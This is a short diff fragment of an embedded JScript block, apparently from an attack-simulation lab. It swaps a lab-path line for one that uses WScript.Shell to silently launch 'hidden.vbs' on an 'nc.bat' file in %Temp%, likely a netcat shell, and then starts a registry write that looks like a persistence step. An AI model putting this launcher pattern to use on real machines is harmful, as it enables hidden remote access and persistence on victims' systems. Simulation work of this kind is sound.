@@ -15,8 +15,6 @@
 		<![CDATA[
 	    		
 
-
-//var start = new ActiveXObject("WScript.Shell").Run('"C:\\Users\\lab-win10\\Desktop\\simulations\\sim_1\\hidden.vbs "C:\\Users\\lab-win10\\Desktop\\simulations\\nc.bat"',1,false);
 var start = new ActiveXObject("WScript.Shell").Run('"%Temp%\\hidden.vbs "%Temp%\\nc.bat"',1,false);
 
 var reg_add = new ActiveXObject("WScript.Shell");
